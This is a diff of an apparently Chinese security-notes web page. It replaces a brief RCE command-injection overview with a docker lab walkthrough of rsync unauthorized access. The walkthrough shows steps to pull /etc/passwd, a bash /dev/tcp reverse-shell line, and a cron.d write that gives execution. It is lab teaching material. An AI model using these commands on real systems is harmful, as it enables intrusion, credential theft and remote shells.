@@ -9,17 +9,17 @@
       
       
       
-        <link rel="prev" href="../PostgreSQL%20%E9%AB%98%E6%9D%83%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-9193%EF%BC%89/">
+        <link rel="prev" href="../narak/">
       
       
-        <link rel="next" href="../Shiro%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%20%EF%BC%88CVE-2020-13933/">
+        <link rel="next" href="../shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%28CVE-2016-4437%29/">
       
       <link rel="icon" href="../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.4.3, mkdocs-material-9.1.14">
     
     
       
-        <title>RCE - 陈奕霖</title>
+        <title>Rsync 未授权访问漏洞 - 陈奕霖</title>
       
     
     
@@ -67,7 +67,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#rceremote-commandcode-execute" class="md-skip">
+        <a href="#_1" class="md-skip">
           跳转至
         </a>
       
@@ -102,7 +102,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              RCE
+              Rsync 未授权访问漏洞
             
           </span>
         </div>
@@ -673,48 +673,11 @@
               
   
   
-    
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          RCE
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../RCE/" class="md-nav__link">
         RCE
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="目录">
-  
-  
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#rceremote-commandcode-execute" class="md-nav__link">
-    RCE(remote command/code execute)概述
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -836,11 +799,55 @@
               
   
   
+    
   
-    <li class="md-nav__item">
-      <a href="../rsync%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Rsync 未授权访问漏洞
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         Rsync 未授权访问漏洞
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    漏洞测试
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    漏洞复现
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -947,8 +954,15 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#rceremote-commandcode-execute" class="md-nav__link">
-    RCE(remote command/code execute)概述
+  <a href="#_1" class="md-nav__link">
+    漏洞测试
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    漏洞复现
   </a>
   
 </li>
@@ -968,19 +982,39 @@
                   
 
 
-  <h1>RCE</h1>
+  <h1>Rsync 未授权访问漏洞</h1>
 
-<h2 id="rceremote-commandcode-execute">RCE(remote command/code execute)概述</h2>
-<p>RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统</p>
-<p>远程系统命令执行</p>
-<p>正常PING</p>
-<p><img alt="img" src="../RCE.assets/wps6.jpg" /> </p>
-<p>Ping 127.0.0.1 | whoami</p>
-<p><img alt="img" src="../RCE.assets/wps7.jpg" /> </p>
-<p>在命令行中一般例如  ipconfig | whoami执行后边命令</p>
-<p>​          ipconfig | |whoami执行前边命令</p>
-<p>​         ipconfig2 | |whoami执行有效命令</p>
-<p>​         ipconfig &amp;&amp;whoami执行后边两个命令</p>
+<p>rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件。</p>
+<h3 id="_1">漏洞测试</h3>
+<p>编译及运行rsync服务器：</p>
+<div class="highlight"><pre><span></span><code>docker-compose build
+
+docker-compose up -d
+</code></pre></div>
+<p>查看873端口是否开启：</p>
+<p><img alt="img" src="../Untitled.assets/wps21-1693319863043.jpg" /> </p>
+<h3 id="_2">漏洞复现</h3>
+<p>可以查看模块名列表，有一个src模块，我们再列出这个模块下的文件：</p>
+<p><img alt="img" src="../Untitled.assets/wps22-1693319863043.jpg" /> </p>
+<p>这是一个Linux根目录，我们可以下载任意文件：</p>
+<div class="highlight"><pre><span></span><code>rsync -av rsync://your-ip:873/src/etc/passwd ./
+</code></pre></div>
+<p><img alt="img" src="../Untitled.assets/wps23-1693319863043.jpg" /> </p>
+<p><img alt="img" src="../Untitled.assets/wps24-1693319863043.jpg" /> </p>
+<p><img alt="img" src="../Untitled.assets/wps25-1693319863043.jpg" /> </p>
+<p>做反弹执行</p>
+<p>写入文件：</p>
+<p>将代码bash -i &gt;&amp; /dev/tcp/your-ip/9999 0&gt;&amp;1 传送给靶机</p>
+<div class="highlight"><pre><span></span><code>rsync -av shell rsync://your-ip:873/src/etc/cron.d/shell
+</code></pre></div>
+<p><img alt="img" src="../Untitled.assets/wps26-1693319863043.jpg" /> </p>
+<p>查看靶机容器内 /etc/shell.txt已写入</p>
+<p><img alt="img" src="../Untitled.assets/wps27-1693319863043.jpg" /> </p>
+<p>然后执行反弹：</p>
+<p><img alt="img" src="../Untitled.assets/wps28-1693319863043.jpg" /> </p>
+<p>监听到结果并获取权限：</p>
+<p><img alt="img" src="../Untitled.assets/wps29-1693319863043.jpg" /> </p>
+<p>结束实验关闭docker：docker-compose down</p>
 
 
 
